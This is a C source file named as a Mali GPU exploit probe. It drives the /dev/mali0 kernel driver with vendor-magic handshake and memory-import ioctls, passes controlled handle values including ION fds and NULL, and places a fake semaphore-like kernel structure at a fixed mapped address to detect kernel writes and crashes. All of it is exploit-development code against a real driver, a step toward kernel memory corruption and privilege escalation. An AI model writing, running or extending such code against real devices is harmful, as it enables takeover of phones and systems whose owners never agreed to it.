/*
 * mali_exploit_probe3.c — Test vendor handshake + controlled phandle
 * Key insight: the crash path uses 0x80 magic for HANDSHAKE too, not just import
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/resource.h>

#define MALI_MAGIC 'M'
#define VENDOR_MAGIC 0x80

struct uk_header { uint32_t id; uint32_t ret; };

static int mali_cmd(int type, int sz) {
    return _IOC(3, type, 0, sz);
}

/* Ion alloc returning dma_buf fd */
static int ion_alloc_fd(void) {
    int ion = open("/dev/ion", O_RDONLY | O_CLOEXEC);
    if (ion < 0) return -1;
    struct { uint64_t len, align; uint32_t heap, flags; int32_t fd; }
        d = {4096, 4096, 1, 0, -1};
    int r = ioctl(ion, 0xc0144900, &d);
    close(ion);
    return (r == 0 && d.fd >= 0) ? d.fd : -1;
}

struct test_cfg {
    int handshake_magic;    /* 'M' or 0x80 */
    int import_magic;       /* 'M' or 0x80 */
    uint32_t phandle;       /* value for phandle field */
    uint32_t type;          /* import type */
    int use_ion_fd;         /* 1 = get real ION fd as phandle */
    int use_fake_struct;    /* 1 = mmap at phandle addr */
    const char *desc;
};

struct test_result {
    int survived;
    int ioctl_ret;
    int ioctl_errno;
    uint32_t result;
    int mods;
};

static void run_single(struct test_cfg *cfg, struct test_result *res) {
    int pipefd[2];
    pipe(pipefd);

    pid_t pid = fork();
    if (pid == 0) {
        close(pipefd[0]);
        alarm(6);

        struct test_result r = {0};

        /* Raise fd limit */
        struct rlimit rl = {4096, 4096};
        setrlimit(RLIMIT_NOFILE, &rl);

        int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
        if (fd < 0) { r.survived = -1; goto done; }

        /* Handshake */
        uint8_t hb[16];
        memset(hb, 0, 16);
        ((struct uk_header*)hb)->id = 0; hb[8] = 10;
        ioctl(fd, mali_cmd(cfg->handshake_magic, 16), hb);
        memset(hb, 0, 16);
        ((struct uk_header*)hb)->id = 530;
        ioctl(fd, mali_cmd(cfg->handshake_magic, 16), hb);

        /* Get phandle value */
        uint32_t phandle = cfg->phandle;
        if (cfg->use_ion_fd) {
            int ion_fd = ion_alloc_fd();
            if (ion_fd < 0) { r.survived = -2; goto done; }
            phandle = (uint32_t)ion_fd;
        }

        /* Map fake struct if requested */
        void *fake = NULL;
        if (cfg->use_fake_struct && phandle >= 0x8000) {
            uint32_t page = phandle & ~0xFFF;
            fake = mmap((void *)(uintptr_t)page, 0x10000,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
            if (fake != MAP_FAILED) {
                /* Fill with valid semaphore pattern */
                for (uint32_t off = 0; off < 0x10000; off += 16) {
                    *(uint32_t *)((char *)fake + off + 0) = 0;         /* spinlock unlocked */
                    *(uint32_t *)((char *)fake + off + 4) = 0x00010001; /* count > 0 */
                    uint32_t a = page + off + 8;
                    *(uint32_t *)((char *)fake + off + 8) = a;          /* list self */
                    *(uint32_t *)((char *)fake + off + 12) = a;
                }
            }
        }

        /* Build import buffer */
        uint8_t buf[48];
        memset(buf, 0, 48);
        *(uint32_t *)(buf + 0) = 513;        /* MEM_IMPORT */
        *(uint32_t *)(buf + 8) = phandle;    /* phandle low */
        *(uint32_t *)(buf + 12) = 0;         /* phandle high */
        *(uint32_t *)(buf + 16) = cfg->type; /* import type */

        r.ioctl_ret = ioctl(fd, mali_cmd(cfg->import_magic, 48), buf);
        r.ioctl_errno = errno;
        r.result = *(uint32_t *)(buf + 4);
        r.survived = 1;

        /* Check fake struct mods */
        if (fake && fake != MAP_FAILED) {
            uint32_t page = phandle & ~0xFFF;
            for (uint32_t off = 0; off < 0x10000; off += 4) {
                uint32_t expected;
                int slot = (off % 16) / 4;
                if (slot == 0) expected = 0;
                else if (slot == 1) expected = 0x00010001;
                else expected = page + (off & ~0xF) + 8;
                if (*(uint32_t *)((char *)fake + off) != expected) r.mods++;
            }
            munmap(fake, 0x10000);
        }

        close(fd);
done:
        write(pipefd[1], &r, sizeof(r));
        close(pipefd[1]);
        _exit(0);
    }

    close(pipefd[1]);
    int status;
    waitpid(pid, &status, 0);

    memset(res, 0, sizeof(*res));
    read(pipefd[0], res, sizeof(*res));
    close(pipefd[0]);

    if (WIFSIGNALED(status)) {
        res->survived = -(100 + WTERMSIG(status));
    }
}

int main() {
    printf("=== Mali Vendor Dispatch — Handshake Magic Comparison ===\n\n");

    struct test_cfg tests[] = {
        /* Control: standard magic for everything */
        {'M', 'M', 0, 2, 1, 0, "std_hs + std_import + ion_fd + type2"},
        /* Vendor handshake, standard import */
        {0x80, 'M', 0, 2, 1, 0, "vendor_hs + std_import + ion_fd + type2"},
        /* Standard handshake, vendor import */
        {'M', 0x80, 0, 2, 1, 0, "std_hs + vendor_import + ion_fd + type2"},
        /* Both vendor (the crash config) */
        {0x80, 0x80, 0, 2, 1, 0, "vendor_hs + vendor_import + ion_fd + type2"},
        /* Both vendor, type=1 (original crash used type=1) */
        {0x80, 0x80, 0, 1, 1, 0, "vendor_hs + vendor_import + ion_fd + type1"},
        /* Vendor hs+import, phandle=0 (NULL), type=2 */
        {0x80, 0x80, 0, 2, 0, 0, "vendor_all + phandle=0 + type2"},
        /* Vendor hs+import, phandle=0, type=1 */
        {0x80, 0x80, 0, 1, 0, 0, "vendor_all + phandle=0 + type1"},
        /* Vendor hs+import, fake struct at 0x100000, type=2 */
        {0x80, 0x80, 0x100000, 2, 0, 1, "vendor_all + fake@0x100000 + type2"},
        /* Vendor hs+import, fake struct at 0x100000, type=1 */
        {0x80, 0x80, 0x100000, 1, 0, 1, "vendor_all + fake@0x100000 + type1"},
    };
    int n = sizeof(tests) / sizeof(tests[0]);

    printf("%-55s survived  ioctl  errno result mods\n", "Config");
    printf("%-55s --------  -----  ----- ------ ----\n", "------");

    for (int i = 0; i < n; i++) {
        struct test_result r;
        run_single(&tests[i], &r);

        printf("%-55s", tests[i].desc);
        if (r.survived == 1) {
            printf(" %4d     %2d     %2d    %3u    %d",
                   r.survived, r.ioctl_ret, r.ioctl_errno, r.result, r.mods);
        } else if (r.survived < -100) {
            printf(" SIG%-3d", -(r.survived + 100));
        } else {
            printf(" err%d", r.survived);
        }
        printf("\n");
    }

    /* Separator */
    printf("\n--- ION fd tests with vendor magic (DANGEROUS if fd triggers crash) ---\n");
    printf("Note: ion_fd is typically 4-10, below mmap_min_addr\n\n");

    /* Now the critical question: does vendor_hs + vendor_import + ion_fd crash? */
    /* Test with type=2 first (less likely to crash based on findings) */
    struct test_cfg danger_test = {0x80, 0x80, 0, 2, 1, 0,
                                   "DANGER: vendor_all + ion_fd + type2"};
    struct test_result dr;
    run_single(&danger_test, &dr);
    printf("%-55s", danger_test.desc);
    if (dr.survived == 1) {
        printf(" OK ioctl=%d errno=%d result=%u\n",
               dr.ioctl_ret, dr.ioctl_errno, dr.result);
    } else if (dr.survived < -100) {
        printf(" SIG%d (CRASH!)\n", -(dr.survived + 100));
    } else {
        printf(" err=%d\n", dr.survived);
    }

    printf("\n=== Done ===\n");
    return 0;
}
